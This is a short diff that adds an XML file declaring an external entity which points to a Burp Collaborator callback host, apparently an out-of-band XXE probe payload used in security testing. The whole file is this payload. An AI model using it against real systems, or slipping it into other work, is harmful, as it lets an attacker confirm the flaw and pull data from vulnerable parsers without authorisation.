@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://2wzkjwafsrod2m9d6tzwjo7p1g79vy.burpcollaborator.net"> ]>
+<test>&xxe;</test>
